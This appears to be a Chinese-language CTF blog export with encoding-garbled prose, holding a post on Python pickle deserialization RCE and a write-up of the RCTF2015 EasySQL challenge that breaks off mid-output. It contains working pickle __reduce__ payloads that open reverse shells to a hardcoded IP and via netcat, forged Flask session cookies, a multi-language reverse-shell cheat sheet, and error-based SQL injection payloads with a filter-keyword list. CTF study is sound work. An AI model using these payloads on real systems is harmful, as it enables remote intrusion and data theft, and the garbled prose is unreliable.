<p>è€Œä¸”åœ¨ååºåˆ—åŒ–è¿‡ç¨‹ä¸­ï¼Œå› ä¸ºç¼–ç¨‹è¯­è¨€éœ€è¦æ ¹æ®ååºåˆ—åŒ–å­—ç¬¦ä¸²å»è§£æå‡ºè‡ªå·±ç‹¬ç‰¹çš„è¯­è¨€æ•°æ®ç»“æ„ï¼Œæ‰€ä»¥å°±å¿…é¡»è¦åœ¨å†…éƒ¨æŠŠè§£æå‡ºæ¥çš„ç»“æ„å»æ‰§è¡Œä¸€ä¸‹ã€‚å¦‚æœåœ¨ååºåˆ—åŒ–è¿‡ç¨‹ä¸­å‡ºç°é—®é¢˜ï¼Œä¾¿å¯èƒ½ç›´æ¥é€ æˆRCEæ¼æ´.</p>
<p>ã€ä¸Šè¿°æ‘˜è‡ªå¸ˆå‚…çš„åšå®¢<a href="https://blog.csdn.net/qq_43431158/article/details/108919605">https://blog.csdn.net/qq_43431158/article/details/108919605</a></p>
<p>å¹¶ä¸”loadsä¼šè‡ªåŠ¨çš„è§£å†³importé—®é¢˜ï¼Œå¯¹äºæ²¡æœ‰å¼•å…¥çš„moduleä¼šè‡ªåŠ¨å°è¯•importï¼Œä¹Ÿå°±æ˜¯è¯´Pythonä¸­æ ‡å‡†åº“çš„ä»£ç æ‰§è¡Œï¼Œå‘½ä»¤æ‰§è¡Œå‡½æ•°æˆ‘ä»¬éƒ½å¯ä»¥ä½¿ç”¨ï¼Œè¿™é‡Œè®°å½•ä¸€ä¸‹å¯ä»¥å°è¯•ä½¿ç”¨çš„ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">eval, execfile, compile, open, file, map, input,</span><br><span class="line">os.system, os.popen, os.popen2, os.popen3, os.popen4, os.open, os.pipe,</span><br><span class="line">os.listdir, os.access,</span><br><span class="line">os.execl, os.execle, os.execlp, os.execlpe, os.execv,</span><br><span class="line">os.execve, os.execvp, os.execvpe, os.spawnl, os.spawnle, os.spawnlp, os.spawnlpe,</span><br><span class="line">os.spawnv, os.spawnve, os.spawnvp, os.spawnvpe,</span><br><span class="line">pickle.load, pickle.loads,cPickle.load,cPickle.loads,</span><br><span class="line">subprocess.call,subprocess.check_call,subprocess.check_output,subprocess.Popen,</span><br><span class="line">commands.getstatusoutput,commands.getoutput,commands.getstatus,</span><br><span class="line">glob.glob,</span><br><span class="line">linecache.getline,</span><br><span class="line">shutil.copyfileobj,shutil.copyfile,shutil.copy,shutil.copy2,shutil.move,shutil.make_archive,</span><br><span class="line">dircache.listdir,dircache.opendir,</span><br><span class="line">io.open,</span><br><span class="line">popen2.popen2,popen2.popen3,popen2.popen4,</span><br><span class="line">timeit.timeit,timeit.repeat,</span><br><span class="line">sys.call_tracing,</span><br><span class="line">code.interact,code.compile_command,codeop.compile_command,</span><br><span class="line">pty.spawn,</span><br><span class="line">posixfile.open,posixfile.fileopen,</span><br><span class="line">platform.popen</span><br></pre></td></tr></table></figure>



<p>å½“ <code>__reduce__()</code> å‡½æ•°è¿”å›ä¸€ä¸ªå…ƒç»„æ—¶ , <strong>ç¬¬ä¸€ä¸ªå…ƒç´ </strong>æ˜¯ä¸€ä¸ªå¯è°ƒç”¨å¯¹è±¡ , è¿™ä¸ªå¯¹è±¡ä¼šåœ¨åˆ›å»ºå¯¹è±¡æ—¶è¢«è°ƒç”¨ . <strong>ç¬¬äºŒä¸ªå…ƒç´ </strong>æ˜¯å¯è°ƒç”¨å¯¹è±¡çš„å‚æ•° , åŒæ ·æ˜¯ä¸€ä¸ªå…ƒç»„ã€‚</p>
<p>ä¾‹å­å¦‚ä¸‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">__reduce__</span>(<span class="params">self</span>):</span></span><br><span class="line">    print(<span class="string">&quot;wdnmd&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">eval</span>, (<span class="string">&quot;print(123213)&quot;</span>,)</span><br><span class="line">person = Person()</span><br><span class="line"></span><br><span class="line">a = pickle.dumps(person,<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">wdnmd</span></span><br><span class="line"><span class="string">cc</span></span><br><span class="line"><span class="string">b&#x27;c__builtin__\neval\np0\n(Vprint(123213)\np1\ntp2\nRp3\n.&#x27;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>

<p>åœ¨ååºåˆ—åŒ–è¿‡ç¨‹ç»“æŸçš„æ—¶å€™ , Python è¿›ç¨‹ä¼šè‡ªåŠ¨è°ƒç”¨ <code>__reduce__()</code> é­”æœ¯æ–¹æ³• . å¦‚æœå¯ä»¥æ§åˆ¶è¢«è°ƒç”¨å‡½æ•°çš„å‚æ•° , Python è¿›ç¨‹å°±å¯ä»¥æ‰§è¡Œæ¶æ„ä»£ç ã€‚</p>
<p><strong>ä½†æ˜¯åœ¨æˆ‘è‡ªå·±è¯•çš„æ—¶å€™ï¼Œå‘ç°å³ä½¿æ˜¯dumpsä¹Ÿä¼šæ‰§è¡Œæˆ‘ä»¬çš„è¯­å¥</strong></p>
<p>å›åˆ°loadsæ¥è¯´ï¼Œloadsä¹Ÿå¯ä»¥ç”¨äºæ‰§è¡Œç³»ç»Ÿå‘½ä»¤ï¼Œé™¤äº†ikuné‚£é“é¢˜ç›®å¤§éƒ¨åˆ†payloadä½¿ç”¨evalä»¥å¤–ï¼Œæˆ‘ä»¬è¿˜å¯ä»¥ä½¿ç”¨</p>
<p>Python2ä¸­åŒ…å«çš„commands.getoutput(),åœ¨Ikunè¿™é“é¢˜å½“ä¸­ï¼š</p>
<p><img src="image-20201207205603107.png" alt="image-20201207205603107"></p>
<p>å¯æƒœè¿™é‡Œåªæ˜¯Python2ç¯å¢ƒï¼Œå¦‚æœåœ¨Python3ç¯å¢ƒå½“ä¸­ï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨subprocess</p>
<h4 id="1-call"><a href="#1-call" class="headerlink" title="(1) call"></a>(1) call</h4><p>æ‰§è¡Œå‘½ä»¤ï¼Œè¿”å›çŠ¶æ€ç (å‘½ä»¤æ­£å¸¸æ‰§è¡Œè¿”å›0ï¼ŒæŠ¥é”™åˆ™è¿”å›1)</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ret1&#x3D;subprocess.call(&quot;ifconfig&quot;)</span><br><span class="line">ret2&#x3D;subprocess.call(&quot;ipconfig&quot;)ã€€ã€€ã€€ã€€#python3.5ä¸æ˜¯è¿™æ ·ï¼Œä¾ç„¶ä¼šæŠ›å‡ºå¼‚å¸¸å¯¼è‡´æ— æ³•å¯¹ret2èµ‹å€¼</span><br><span class="line">print(ret1)     #0</span><br><span class="line">print(ret2)     #1</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ret &#x3D; subprocess.call([&quot;ls&quot;, &quot;-l&quot;], shell&#x3D;False)    #shellä¸ºFalseçš„æ—¶å€™å‘½ä»¤å¿…é¡»åˆ†å¼€å†™</span><br><span class="line">ret &#x3D; subprocess.call(&quot;ls -l&quot;, shell&#x3D;True)</span><br></pre></td></tr></table></figure>

<h4 id="2-check-call"><a href="#2-check-call" class="headerlink" title="(2) check_call"></a>(2) check_call</h4><p>æ‰§è¡Œå‘½ä»¤ï¼Œå¦‚æœæ‰§è¡ŒæˆåŠŸåˆ™è¿”å›çŠ¶æ€ç 0ï¼Œå¦åˆ™æŠ›å¼‚å¸¸</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">subprocess.check_call([&quot;ls&quot;, &quot;-l&quot;])</span><br><span class="line">subprocess.check_call(&quot;exit 1&quot;, shell&#x3D;True)</span><br></pre></td></tr></table></figure>

<h4 id="3-check-output"><a href="#3-check-output" class="headerlink" title="(3) check_output"></a>(3) check_output</h4><p>æ‰§è¡Œå‘½ä»¤ï¼Œå¦‚æœæ‰§è¡ŒæˆåŠŸåˆ™è¿”å›æ‰§è¡Œç»“æœï¼Œå¦åˆ™æŠ›å¼‚å¸¸</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">subprocess.check_output([&quot;echo&quot;, &quot;Hello World!&quot;])</span><br><span class="line">subprocess.check_output(&quot;exit 1&quot;, shell&#x3D;True)</span><br></pre></td></tr></table></figure>

<h4 id="4-subprocess-Popen-â€¦"><a href="#4-subprocess-Popen-â€¦" class="headerlink" title="(4) subprocess.Popen(â€¦)"></a>(4) subprocess.Popen(â€¦)</h4><h2 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> commands</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">payload</span>(<span class="params"><span class="built_in">object</span></span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__reduce__</span>(<span class="params">self</span>):</span></span><br><span class="line">       <span class="keyword">return</span> (commands.getstatusoutput, (<span class="string">&quot;&quot;&quot;python -c &#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;118.89.227.105&quot;,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#x27;&quot;&quot;&quot;</span>,))</span><br><span class="line"></span><br><span class="line">a = pickle.dumps(payload())</span><br><span class="line">a = base64.b64encode(a)</span><br><span class="line"><span class="built_in">print</span> a</span><br></pre></td></tr></table></figure>





<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span>:</span></span><br><span class="line">    uname = <span class="string">&#x27;123&#x27;</span></span><br><span class="line">    is_admin = <span class="number">1</span></span><br><span class="line">    __repr__ = <span class="keyword">lambda</span> o: o.uname</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__reduce__</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">return</span> (<span class="built_in">eval</span>, (<span class="string">&quot;__import__(&#x27;os&#x27;).system(&#x27;nc ip port -e /bin/sh&#x27;)&quot;</span>,))</span><br><span class="line"></span><br><span class="line"> <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string"> &#123;&#x27;u&#x27;:b&#x27;gASVVgAAAAAAAACMCGJ1aWx0aW5zlIwEZXZhbJSTlIw6X19pbXBvcnRfXygnb3MnKS5wb3BlbignZWNobyBgY2F0IC9mbGFnIGAgPiAvZjFhZycpLnJlYWQoKZSFlFKULg&#x27;&#125;</span></span><br><span class="line"><span class="string"> &#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>



<p>ç”Ÿæˆï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">.eJwtxz0OgjAYANCrmJ6AxkkTF5RiSKjB_tFvA0oUaKGJVojEu-vg8Ia3ooD2K9rUaI8gIlxaGAtB4r8TF_TMenKX29usZYNbt2QmkpUiftKD5zL9_Q0653bW9n40jgbhQLfKBN1TWg9PTkvT5VH20M6OtfUld7uuFdmoeJbmiT1dFO6uEQQmTAw49kUJVTXApEbbN8kSmFtAYvJi2POrW1KGZQ7z4YA-ny8R0kGX.YJtLwg<span class="number">.1</span>ycpGY0sFxDjHFKYijGZpMALrZA</span><br></pre></td></tr></table></figure>

<p>python2 python3 çš„ä¼ªé€ æ˜¯ä¸€æ ·çš„</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">.eJwtx7sOgjAUANBfMf2CNk44ohZDQo32Re8GlsijxSZaJRD-XQeHM5wFRbRb0KZGOwSYCuVgvEia_h2EZCfe01Zt7x-jbqTxU26xqjQNDzMEobLfZzCFcB_j2r31LEoPptE2mp6xengJVtquwPnTeDfWLpTCJ10j81GLPCuO7nDWpLtiiFzaFEgaLiVU1QAPPbr-dpwi9xMoQt-cBHH1U8aJKmDGCVrXLxGTQYk.YJtMnQ.Lc_vWp_w-A5CC1P_PqD6EGSzPfM</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">python3 flask_session_cookie_manager3.py encode -s <span class="string">&#x27;glzjin22948575858jfjfjufirijidjitg3uiiuuh&#x27;</span> -t <span class="string">&quot;&#123;&#x27;u&#x27;:&#123;&#x27;b&#x27;:&#x27;gASVRwAAAAAAAACMCGJ1aWx0aW5zlIwEZXZhbJSTlIwrX19pbXBvcnRfXygnb3MnKS5zeXN0ZW0oJ2NhdCAvZmxhZyA+IC8xMjMnKZSFlFKULg==&#x27;&#125;&#125;&quot;</span></span><br></pre></td></tr></table></figure>



<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">python2 flask_session_cookie_manager2.py encode -s <span class="string">&#x27;glzjin22948575858jfjfjufirijidjitg3uiiuuh&#x27;</span> -t <span class="string">&quot;&#123;&#x27;u&#x27;:&#123;&#x27;b&#x27;:&#x27;gASVWQAAAAAAAACMCGJ1aWx0aW5zlIwEZXZhbJSTlIw9X19pbXBvcnRfXygnb3MnKS5zeXN0ZW0oJ25jIDgxLjY5LjIwMS42NSA0MDAxIC1lIC9iaW4vYmFzaCAnKZSFlFKULg==&#x27;&#125;&#125;&quot;</span></span><br></pre></td></tr></table></figure>



<p>åå¼¹shell:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">bashåå¼¹</span></span><br><span class="line">bash -i &gt;&amp; /dev/tcp/192.168.10.27/4444 0&gt;&amp;1</span><br><span class="line"><span class="meta">#</span><span class="bash">pythonåå¼¹</span></span><br><span class="line">python -c &#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;192.168.10.27&quot;,4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/bash&quot;,&quot;-i&quot;]);&#x27;</span><br><span class="line"><span class="meta">#</span><span class="bash">Perlåå¼¹</span></span><br><span class="line">perl -e &#x27;use Socket;$i=&quot;10.0.0.1&quot;;$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);&#125;;&#x27;</span><br><span class="line"><span class="meta">#</span><span class="bash">PHPåå¼¹</span></span><br><span class="line">php -r &#x27;$sock=fsockopen(&quot;10.0.0.1&quot;,1234);exec(&quot;/bin/sh -i &lt;&amp;3&gt;&amp;3 2&gt;&amp;3&quot;);&#x27;</span><br><span class="line"><span class="meta">#</span><span class="bash">Rubyåå¼¹</span></span><br><span class="line">ruby -rsocket -e&#x27;f=TCPSocket.open(&quot;10.0.0.1&quot;,1234).to_i;exec sprintf(&quot;/bin/sh -i &lt;&amp;%d&gt;&amp;%d 2&gt;&amp;%d&quot;,f,f,f)&#x27;</span><br><span class="line"><span class="meta">#</span><span class="bash">Javaåå¼¹</span></span><br><span class="line">r = Runtime.getRuntime() p = r.exec([&quot;/bin/bash&quot;,&quot;-c&quot;,&quot;exec 5&lt;&gt;/dev/tcp/10.0.0.1/2002;cat &lt;&amp;5 2=&quot;&quot; |=&quot;&quot; while=&quot;&quot; read=&quot;&quot; line;=&quot;&quot; do=&quot;&quot; \$line=&quot;&quot;&gt;&amp;5 &gt;&amp;5; done&quot;] as String[]) p.waitFor()</span><br></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title>RCTF2015EasySQL</title>
    <url>/2020/11/18/RCTF2015EasySQL/</url>
    <content><![CDATA[<h1 id="è€ƒç‚¹ï¼š"><a href="#è€ƒç‚¹ï¼š" class="headerlink" title="è€ƒç‚¹ï¼š"></a>è€ƒç‚¹ï¼š</h1><p>ä¸€ä¸ªSQLæ³¨å…¥ï¼ŒäºŒæ¬¡æ³¨å…¥+æŠ¥é”™æ³¨å…¥</p>
<p>å½“æˆ‘ä»¬æ³¨å†Œç”¨æˆ·ä¿®æ”¹å¯†ç çš„æ—¶å€™ä¾¿ä¼šè§¦å‘</p>
<h1 id="è¿‡ç¨‹ï¼š"><a href="#è¿‡ç¨‹ï¼š" class="headerlink" title="è¿‡ç¨‹ï¼š"></a>è¿‡ç¨‹ï¼š</h1><p>æˆ‘ä»¬å¯ä»¥æµ‹è¯•ä¸€ä¸‹è¢«è¿‡æ»¤äº†ä»€ä¹ˆï¼š</p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">length </span><br><span class="line">+</span><br><span class="line">handler</span><br><span class="line">like</span><br><span class="line">select </span><br><span class="line">sleep</span><br><span class="line">database</span><br><span class="line">delete</span><br><span class="line">having</span><br><span class="line">or</span><br><span class="line">as</span><br><span class="line">-~</span><br><span class="line">BENCHMARK</span><br><span class="line">limit</span><br><span class="line">left</span><br><span class="line">select</span><br><span class="line">insert</span><br><span class="line">sys.schema_auto_increment_columns</span><br><span class="line">join</span><br><span class="line">right</span><br><span class="line">#</span><br><span class="line">&amp;</span><br><span class="line">&amp;&amp;</span><br><span class="line">\</span><br><span class="line">handler</span><br><span class="line">-- -</span><br><span class="line">--</span><br><span class="line">--+</span><br><span class="line">INFORMATION</span><br><span class="line">--</span><br><span class="line">;</span><br><span class="line">!</span><br><span class="line">%</span><br><span class="line">+</span><br><span class="line">xor</span><br><span class="line">&lt;&gt;</span><br><span class="line">(</span><br><span class="line">&gt;</span><br><span class="line">&lt;</span><br><span class="line">)</span><br><span class="line">.</span><br><span class="line">^</span><br><span class="line">=</span><br><span class="line">AND</span><br><span class="line">BY</span><br><span class="line">CAST</span><br><span class="line">COLUMN</span><br><span class="line">COUNT</span><br><span class="line">CREATE</span><br><span class="line">END</span><br><span class="line">case</span><br><span class="line">&#x27;1&#x27;=&#x27;1</span><br><span class="line">when</span><br><span class="line">admin&#x27;</span><br><span class="line">&quot;</span><br><span class="line">length </span><br><span class="line">+</span><br><span class="line">length</span><br><span class="line">REVERSE</span><br><span class="line"></span><br><span class="line">ascii</span><br><span class="line">select </span><br><span class="line">database</span><br><span class="line">left</span><br><span class="line">right</span><br><span class="line">&#x27;</span><br><span class="line">union</span><br><span class="line">||</span><br><span class="line">oorr</span><br><span class="line">/</span><br><span class="line">//</span><br><span class="line">//*</span><br><span class="line">*/*</span><br><span class="line">/**/</span><br><span class="line">anandd</span><br><span class="line">GROUP</span><br><span class="line">HAVING</span><br><span class="line">IF</span><br><span class="line">INTO</span><br><span class="line">JOIN</span><br><span class="line">LEAVE</span><br><span class="line">LEFT</span><br><span class="line">LEVEL</span><br><span class="line">sleep</span><br><span class="line">LIKE</span><br><span class="line">NAMES</span><br><span class="line">NEXT</span><br><span class="line">NULL</span><br><span class="line">OF</span><br><span class="line">ON</span><br><span class="line">|</span><br><span class="line">infromation_schema</span><br><span class="line">user</span><br><span class="line">OR</span><br><span class="line">ORDER</span><br><span class="line">ORD</span><br><span class="line">SCHEMA</span><br><span class="line">SELECT</span><br><span class="line">SET</span><br><span class="line">TABLE</span><br><span class="line">THEN</span><br><span class="line">UPDATE</span><br><span class="line">USER</span><br><span class="line">USING</span><br><span class="line">VALUE</span><br><span class="line">VALUES</span><br><span class="line">WHEN</span><br><span class="line">WHERE</span><br><span class="line">ADD</span><br><span class="line">AND</span><br><span class="line">prepare</span><br><span class="line">set</span><br><span class="line">update</span><br><span class="line">delete</span><br><span class="line">drop</span><br><span class="line">inset</span><br><span class="line">CAST</span><br><span class="line">COLUMN</span><br><span class="line">CONCAT</span><br><span class="line">GROUP_CONCAT</span><br><span class="line">group_concat</span><br><span class="line">CREATE</span><br><span class="line">DATABASE</span><br><span class="line">DATABASES</span><br><span class="line">alter</span><br><span class="line">DELETE</span><br><span class="line">DROP</span><br><span class="line">floor</span><br><span class="line">rand()</span><br><span class="line">information_schema.tables</span><br><span class="line">TABLE_SCHEMA</span><br><span class="line">%df</span><br><span class="line">concat_ws()</span><br><span class="line">concat</span><br><span class="line">LIMIT</span><br><span class="line">ORD</span><br><span class="line">ON</span><br><span class="line">extractvalue</span><br><span class="line">order </span><br><span class="line">CAST()</span><br><span class="line">by</span><br><span class="line">ORDER</span><br><span class="line">OUTFILE</span><br><span class="line">RENAME</span><br><span class="line">REPLACE</span><br><span class="line">SCHEMA</span><br><span class="line">SELECT</span><br><span class="line">SET</span><br><span class="line">updatexml</span><br><span class="line">SHOW</span><br><span class="line">SQL</span><br><span class="line">TABLE</span><br><span class="line">THEN</span><br><span class="line">TRUE</span><br><span class="line">instr</span><br><span class="line">benchmark</span><br><span class="line">format</span><br><span class="line">bin</span><br><span class="line">substring</span><br><span class="line">ord</span><br><span class="line"></span><br><span class="line">UPDATE</span><br><span class="line">VALUES</span><br><span class="line">VARCHAR</span><br><span class="line">VERSION</span><br><span class="line">WHEN</span><br><span class="line">WHERE</span><br><span class="line">/*</span><br><span class="line">`</span><br><span class="line">  </span><br><span class="line">,</span><br><span class="line">users</span><br><span class="line">%0a</span><br><span class="line">%0b</span><br><span class="line">mid</span><br><span class="line">for</span><br><span class="line">BEFORE</span><br><span class="line">REGEXP</span><br><span class="line">RLIKE</span><br><span class="line">in</span><br><span class="line">sys schemma</span><br><span class="line">SEPARATOR</span><br><span class="line">XOR</span><br><span class="line">CURSOR</span><br><span class="line">FLOOR</span><br><span class="line">sys.schema_table_statistics_with_buffer</span><br><span class="line">INFILE</span><br><span class="line">count</span><br><span class="line">%0c</span><br><span class="line">from</span><br><span class="line">%0d</span><br><span class="line">%a0</span><br><span class="line">=</span><br><span class="line">@</span><br><span class="line">else</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>ç›´æ¥ç”¨åˆ«äººçš„å­—å…¸æ¥æŸ¥ä¸€ä¸‹</p>
<p>å¤§æ¦‚å¯¹æˆ‘ä»¬æ³¨å…¥æœ‰å½±å“çš„åªæœ‰ç©ºæ ¼ï¼Œselectçš„è¯æˆ‘ä»¬å¯ä»¥ç”¨å¤§å°å†™çš„æ–¹å¼è¿›è¡Œç»•è¿‡ï¼Œäºæ˜¯å»mysqlé‡Œé¢å°è¯•æ„é€ å‡ºè¯­å¥ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">mysql&gt; select * from websites where id &#x3D;1 and(select updatexml(1,concat(&#39;~&#39;,(select(database()))),1));</span><br><span class="line">ERROR 1105 (HY000): XPATH syntax error: &#39;~runoob&#39;</span><br><span class="line">mysql&gt; select * from websites where id &#x3D;1 and(select updatexml(1,concat(&#39;~&#39;,(select(database()))),1));</span><br><span class="line">ERROR 1105 (HY000): XPATH syntax error: &#39;~runoob&#39;</span><br><span class="line">mysql&gt; select * from websites where id &#x3D;1 and(select(updatexml(1,concat(&#39;~&#39;,(select(database()))),1)));</span><br><span class="line">ERROR 1105 (HY000): XPATH syntax error: &#39;~runoob&#39;</span><br></pre></td></tr></table></figure>

<p>å¾—åˆ°æ³¨å…¥è¯­å¥ï¼š</p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">admin&quot;^(select(updatexml(1,concat(&#x27;~&#x27;,(select(database()))),1)))#</span><br><span class="line">#XPATH syntax error: &#x27;~web_sqli&#x27;</span><br></pre></td></tr></table></figure>

<p>å¾—åˆ°æ•°æ®åº“çš„åå­—.</p>
<p>ä¸‹ä¸€æ­¥è·å–è¡¨åï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">admin&quot;^(select(updatexml(1,concat(0x7e,(select(table_name)from(information_schema.tables)where(table_schema&#x3D;database()))),0x7e)))#</span><br></pre></td></tr></table></figure>

<p>è¿™æ ·çš„è¯ä¼šæŠ¥é”™ï¼ŒSubquery returns more than 1 rowï¼Œå› ä¸ºä¸æ­¢ä¸€ä¸ªè¡¨ï¼Œé‚£æˆ‘ä»¬æ·»åŠ group_concatå‡½æ•°</p>
<p>åœ¨mysqlä¸­æµ‹è¯•ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mysql&gt; select * from student where STID&#x3D;1 and (select(updatexml(1,concat(0x7e,(select(table_name)from(information_schema.tables)where(table_schema&#x3D;database()))),0x7e)));</span><br><span class="line">ERROR 1242 (21000): Subquery returns more than 1 row</span><br><span class="line">mysql&gt; select * from student where STID&#x3D;1 and (select(updatexml(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema&#x3D;database()))),0x7e)));</span><br><span class="line">ERROR 2013 (HY000): Lost connection to MySQL server during query</span><br><span class="line">mysql&gt; select * from student where STID&#x3D;1 and (select(updatexml(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema&#x3D;database()))),0x7e)));</span><br></pre></td></tr></table></figure>

<p>å¾—åˆ°è¡¨åï¼š</p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">XPATH syntax error: &#x27;~article,flag,users&#x27;</span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œæå‰å‰§é€ä¸€ä¸‹ï¼Œflagè¡¨çš„ä¸œè¥¿æ˜¯å‡flagï¼Œçº¯ç²¹ä½œè€…æå¿ƒæ€çš„ï¼Œæˆ‘ä¸€ç›´è§‰å¾—è¿™ç§ä¸œè¥¿å¾ˆå¤šä½™å¥½å§ã€‚</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mysql&gt; select * from student WHERE STID&#x3D;1 and(select updatexml(1,concat(0x7e,(select group_concat(column_name)from information_schema.columns where table_name&#x3D;&quot;student&quot;)),0x7e));</span><br><span class="line">ERROR 1105 (HY000): XPATH syntax error: &#39;~STID,STNAME,STSEX,STAGE,STPHONE&#39;</span><br><span class="line">mysql&gt; select * from student WHERE STID&#x3D;1 and(select updatexml(1,concat(0x7e,(select group_concat(column_name)from information_schema.columns where table_name&#x3D;&quot;student&quot;)),0x7e));</span><br></pre></td></tr></table></figure>

<p>å¾—åˆ°å­—æ®µåï¼š</p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">XPATH syntax error: &#x27;~name,pwd,email,real_flag_1s_her&#x27;</span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œå…¶å®æˆ‘ä»¬å°±å¯ä»¥å‘ç°ä¸€ä¸ªä¸æ–¹ä¾¿çš„åœ°æ–¹äº†ï¼ŒæŠ¥é”™æ³¨å…¥çš„å›æ˜¾æ˜¯æœ‰é™çš„ï¼Œæ‰€ä»¥è¿™é‡Œåé¢åº”è¯¥æ˜¯hereï¼Œå´æ²¡æœ‰æ˜¾ç¤ºå‡ºæ¥</p>
<p>æ³¨å…¥ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">admin&quot;^(select(updatexml(1,concat(0x7e,(select(group_concat(real_flag_1s_here))from(users))),0x7e)))#</span><br></pre></td></tr></table></figure>

<p>å¾—åˆ°çš„ä¸œè¥¿å¾ˆå¥‡æ€ªï¼š</p>
<p>~xxxx,xxx,xxxä»€ä¹ˆçš„ï¼Œè¿™å°±å¾ˆæ¶å¿ƒäººäº†ï¼Œäºæ˜¯æˆ‘ä»¬å°è¯•ç”¨æ­£åˆ™è¡¨è¾¾å¼æ¥åŒ¹é…æˆ‘ä»¬éœ€è¦çš„æ•°æ®</p>
<p>åˆ«äººçš„è¯­å¥ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">admin&quot;||(updatexml(1,concat(0x3a,(select(group_concat(real_flag_1s_here))from(users)where(real_flag_1s_here)regexp(&#39;^f&#39;))),1))#</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>å¾—åˆ°å‰åŠæ®µçš„flagï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">XPATH syntax error: &#39;:flag&#123;8091937b-0547-42a3-b7b3-41&#39;</span><br></pre></td></tr></table></figure>

<p>è¿™æ ·çš„è¯è¿˜æ˜¯ä¸å¤Ÿï¼Œæˆ‘ä»¬åº”è¯¥è·å–å…¨éƒ¨çš„æ•°æ®ï¼Œäºæ˜¯ç»§ç»­æ„é€ ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">ERROR 1105 (HY000): XPATH syntax error: &#39;~fuzhufuzh&#39;</span><br><span class="line">mysql&gt;  select * from student where STID &#x3D;1 and(select(updatexml(1,concat(0x7e,(select(group_concat(STNAME))from student)),0x7e)));</span><br><span class="line">ERROR 1105 (HY000): XPATH syntax error: &#39;~fuzhufuzh&#39;</span><br><span class="line">mysql&gt;  select * from student where STID &#x3D;1 and(select(updatexml(1,concat(0x7e,(select reverse((group_concat(STNAME)))from student)),0x7e)));</span><br><span class="line">ERROR 1105 (HY000): XPATH syntax error: &#39;~hzufuhzuf&#39;</span><br><span class="line">mysql&gt;  select * from student where STID &#x3D;1 and(select(updatexml(1,concat(0x7e,(select(reverse((group_concat(STNAME))))from student)),0x7e)));</span><br><span class="line">ERROR 2013 (HY000): Lost connection to MySQL server during query</span><br><span class="line">mysql&gt;  select * from student where STID &#x3D;1 and(select(updatexml(1,concat(0x7e,(select(reverse((group_concat(STNAME))))from student)),0x7e)));</span><br><span class="line">ERROR 2006 (HY000): MySQL server has gone away</span><br><span class="line">No connection. Trying to reconnect...</span><br><span class="line">Connection id:    11</span><br><span class="line">Current database: webos</span><br><span class="line"></span><br><span class="line">ERROR 1105 (HY000): XPATH syntax error: 